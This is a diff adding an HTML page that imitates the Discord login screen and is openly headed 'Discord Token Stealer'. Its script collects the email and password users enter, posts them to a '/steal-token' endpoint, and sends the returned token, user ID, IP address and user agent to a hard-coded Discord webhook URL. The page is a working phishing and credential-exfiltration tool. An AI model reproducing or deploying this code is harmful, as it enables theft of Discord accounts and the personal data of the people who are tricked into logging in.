@@ -1,0 +1,279 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Discord login</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #36393F;
+            color: white;
+        }
+        
+        .container {
+            max-width: 400px;
+            margin: 50px auto;
+            padding: 20px;
+            background-color: #2C2F33;
+            border-radius: 5px;
+            box-shadow: 0 0 10px rgba(0,0,0,0.5);
+        }
+        
+        h1 {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+        
+        .form-group {
+            margin-bottom: 15px;
+        }
+        
+        label {
+            display: block;
+            margin-bottom: 5px;
+        }
+        
+        input[type="email"], input[type="password"] {
+            width: 100%;
+            padding: 10px;
+            border: 1px solid #40444B;
+            border-radius: 3px;
+            background-color: #18191C;
+            color: white;
+        }
+        
+        button {
+            width: 100%;
+            padding: 10px;
+            background-color: #7289DA;
+            color: white;
+            border: none;
+            border-radius: 3px;
+            cursor: pointer;
+            transition: background-color 0.2s;
+        }
+        
+        button:hover {
+            background-color: #677BC4;
+        }
+        
+        .result {
+            margin-top: 20px;
+            padding: 10px;
+            background-color: #18191C;
+            border-radius: 3px;
+            display: none;
+        }
+        
+        .error {
+            color: #FF4D4D;
+            margin-top: 20px;
+            padding: 10px;
+            background-color: #2C2F33;
+            border-radius: 3px;
+            display: none;
+        }
+        
+        .success {
+            color: #4CAF50;
+            margin-top: 20px;
+            padding: 10px;
+            background-color: #2C2F33;
+            border-radius: 3px;
+            display: none;
+        }
+        
+        .token-info {
+            margin-top: 10px;
+            padding: 10px;
+            background-color: #18191C;
+            border-radius: 3px;
+            display: none;
+        }
+        
+        .webhook-info {
+            margin-top: 10px;
+            padding: 10px;
+            background-color: #18191C;
+            border-radius: 3px;
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Discord Token Stealer</h1>
+        <form id="loginForm">
+            <div class="form-group">
+                <label for="email">Email:</label>
+                <input type="email" id="email" required>
+            </div>
+            <div class="form-group">
+                <label for="password">Password:</label>
+                <input type="password" id="password" required>
+            </div>
+            <button type="submit">Steal Token</button>
+        </form>
+        
+        <div class="result" id="result">
+            <h2>Stealing Token...</h2>
+        </div>
+        
+        <div class="error" id="error">
+            <h2>Error</h2>
+        </div>
+        
+        <div class="success" id="success">
+            <h2>Success!</h2>
+            <p>Your token has been stolen successfully.</p>
+        </div>
+        
+        <div class="token-info" id="tokenInfo">
+            <h2>Token Information</h2>
+            <p><strong>Token:</strong> <span id="tokenValue"></span></p>
+            <p><strong>User ID:</strong> <span id="userIdValue"></span></p>
+            <button onclick="copyToken()">Copy Token</button>
+        </div>
+        
+        <div class="webhook-info" id="webhookInfo">
+            <h2>Webhook Information</h2>
+            <p><strong>Status:</strong> <span id="webhookStatus"></span></p>
+            <p><strong>Message:</strong> <span id="webhookMessage"></span></p>
+        </div>
+    </div>
+
+    <script>
+        document.getElementById('loginForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+            
+            // Show loading state
+            document.getElementById('result').style.display = 'block';
+            document.getElementById('error').style.display = 'none';
+            document.getElementById('success').style.display = 'none';
+            document.getElementById('tokenInfo').style.display = 'none';
+            document.getElementById('webhookInfo').style.display = 'none';
+            
+            try {
+                // Simulate token stealing process
+                const response = await fetch('/steal-token', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({email, password})
+                });
+                
+                const data = await response.json();
+                
+                if (data.token) {
+                    // Show success
+                    document.getElementById('result').style.display = 'none';
+                    document.getElementById('success').style.display = 'block';
+                    
+                    // Show token info
+                    document.getElementById('tokenValue').textContent = data.token;
+                    document.getElementById('userIdValue').textContent = data.userId;
+                    document.getElementById('tokenInfo').style.display = 'block';
+                    
+                    // Send to webhook
+                    sendToWebhook(data);
+                } else {
+                    // Show error
+                    document.getElementById('result').style.display = 'none';
+                    document.getElementById('error').style.display = 'block';
+                    document.getElementById('error').innerHTML = `<h2>Error</h2><p>${data.error}</p>`;
+                }
+            } catch (err) {
+                console.error(err);
+                // Show error
+                document.getElementById('result').style.display = 'none';
+                document.getElementById('error').style.display = 'block';
+                document.getElementById('error').innerHTML = `<h2>Error</h2><p>An unexpected error occurred.</p>`;
+            }
+        });
+        
+        function sendToWebhook(data) {
+            // Get webhook URL from environment or localStorage
+            const webhookUrl = localStorage.getItem('https://discord.com/api/webhooks/1482859214895579258/x10n-msqCo7M31DlpZn04j9z9-PTT3zQsdR_ML2IFqTDH6_M4DZUP1xqczTpNEXctcpP') || 'YOUR_WEBHOOK_URL';
+            
+            // Prepare webhook payload
+            const payload = {
+                content: `Discord Token Stealer - New Token Detected`,
+                embeds: [{
+                    title: "Token Stealer Results",
+                    color: 0x7289DA,
+                    fields: [
+                        {
+                            name: "Email",
+                            value: data.email,
+                            inline: true
+                        },
+                        {
+                            name: "Token",
+                            value: data.token,
+                            inline: true
+                        },
+                        {
+                            name: "User ID",
+                            value: data.userId,
+                            inline: true
+                        },
+                        {
+                            name: "Client IP",
+                            value: data.clientIp,
+                            inline: true
+                        },
+                        {
+                            name: "User Agent",
+                            value: data.userAgent,
+                            inline: true
+                        }
+                    ],
+                    footer: {
+                        text: "Discord Login"
+                    }
+                }]
+            };
+            
+            // Send to webhook
+            fetch(webhookUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(payload)
+            })
+            .then(response => {
+                // Show webhook status
+                document.getElementById('webhookStatus').textContent = response.ok ? 'Success' : 'Failed';
+                document.getElementById('webhookMessage').textContent = response.ok ? 'Token sent to webhook' : 'Failed to send token';
+                document.getElementById('webhookInfo').style.display = 'block';
+                
+                if (!response.ok) {
+                    throw new Error(`HTTP error! status: ${response.status}`);
+                }
+            })
+            .catch(error => {
+                console.error('Webhook error:', error);
+                document.getElementById('webhookStatus').textContent = 'Failed';
+                document.getElementById('webhookMessage').textContent = error.message;
+                document.getElementById('webhookInfo').style.display = 'block';
+            });
+        }
+        
+        function copyToken() {
+            const token = document.getElementById('tokenValue').textContent;
+            navigator.clipboard.writeText(token)
+                .then(() => {
+                    alert('Token copied to clipboard!');
+                })
+                .catch(err => {
+                    console.error(err);
+                    alert('Failed to copy token.');
+                });
+        }
+    </script>
+</body>
+</html>
